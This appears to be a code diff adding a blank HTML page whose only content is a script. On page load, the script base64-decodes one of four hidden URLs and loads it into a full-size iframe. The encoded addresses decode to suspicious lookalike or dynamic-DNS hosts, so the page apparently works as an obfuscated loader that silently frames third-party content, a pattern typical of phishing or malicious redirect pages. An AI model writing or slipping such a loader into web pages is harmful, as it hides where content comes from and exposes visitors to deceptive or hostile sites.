@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      border: none;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    window.onload = function() {
+      const links = [];
+      links[0] = "aHR0cHM6Ly9nb3Yua2plLnVzLw==";
+      links[1] = "aHR0cHM6Ly9iaW5nLmJpenVpdC5jb20vIA==";
+      links[2] = "aHR0cHM6Ly9zY2llbmNlLmljaWNsZXNtcC5uZXQv==";
+      links[3] = "aHR0cHM6Ly9zY2hvb2x0ZWNocmVhZG9uZy5teXdpcmUub3JnLw==";
+
+      var selected_link = links[1];
+      var decoded_link = atob(selected_link);
+      console.log(decoded_link);
+
+      var iframe = document.createElement('iframe');
+      iframe.src = decoded_link;
+      iframe.width = "100%";
+      iframe.height = "640px";
+      document.body.appendChild(iframe);
+    }
+  </script>
+</body>
+</html>
